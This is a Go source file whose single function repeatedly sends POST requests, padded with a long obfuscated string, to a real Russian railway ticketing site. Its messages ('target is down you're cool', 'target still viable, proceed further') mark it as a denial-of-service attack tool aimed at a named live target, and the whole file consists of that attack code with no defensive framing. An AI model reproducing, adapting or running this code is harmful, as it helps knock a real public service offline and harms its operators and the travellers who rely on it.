package main

import (
	"log"
	"net/http"
	"strings"
	"time"
)

func httpTicket(ch chan string) {
	client := &http.Client{}
	cmd := "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"
	key := "98336db4-3ee5-4af7-84a8-69906aa16b86"
	d := strings.NewReader(cmd)
	url := "http://pass.rzd.ru/timetable/public/ru?STRUCTURE_ID=735&layer_id=5705&actorType=desktop_2016&rid" + key + "&dir=" + cmd
	req, err := http.NewRequest("POST", url, d)
	if err != nil {
		log.Println("URL isn't Valid!")
	}
	req.Header.Set("Content-Type", "application/json")
	client.Timeout = 5 * time.Second

	_, rerr := client.Do(req)
	if rerr != nil {
		ch <- "target still viable, proceed further"
	} else {
		ch <- "target is down you're cool"
	}
}